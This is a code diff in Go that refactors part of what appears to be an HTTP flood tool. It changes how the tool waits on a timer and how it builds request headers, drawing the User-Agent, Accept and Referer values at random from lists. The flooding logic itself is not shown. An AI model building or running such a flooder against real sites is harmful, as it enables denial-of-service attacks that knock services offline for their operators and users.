@@ -69,10 +69,8 @@ func (f *flooder) Flood() {
 
 	f.timer = time.NewTimer(f.duration)
 
-	select {
-	case <-f.timer.C:
-		f.Stop()
-	}
+	<-f.timer.C
+	f.Stop()
 
 	f.timer.Stop()
 }
@@ -107,21 +105,26 @@ func (f *flooder) configRequest() *http.Request {
 		log.Fatal(err)
 	}
 
-	header := []string{
-		"Connection: Keep-Alive, Cache-Control: max-age=0",
-		"User-Agent: " + getUserAgent(),
-		acceptall[rand.Intn(len(acceptall))],
-		referers[rand.Intn(len(referers))],
-	}
+	userAgent := getUserAgent()
+	accept := acceptall[rand.Intn(len(acceptall))]
+	referer := referers[rand.Intn(len(referers))]
 
-	for _, header := range header {
-		splitedHeader := strings.SplitN(header, ":", 2)
-		if len(splitedHeader) == 2 {
-			defaultRequest.Header.Add(strings.TrimSpace(splitedHeader[0]), strings.TrimSpace(splitedHeader[1]))
-		}
-	}
+	header := fmt.Sprintf("Connection: Keep-Alive\nCache-Control: max-age=0\nUser-Agent: %s\n%s\n%s", userAgent, accept, referer)
+
+	f.splitHeader(header, defaultRequest)
 
 	return defaultRequest
+}
+
+func (f *flooder) splitHeader(header string, request *http.Request) {
+	pairs := strings.Split(header, "\n")
+
+	for _, pair := range pairs {
+		parts := strings.SplitN(pair, ": ", 2)
+		if len(parts) == 2 {
+			request.Header.Add(parts[0], parts[1])
+		}
+	}
 }
 
 func (f *flooder) Stop() {
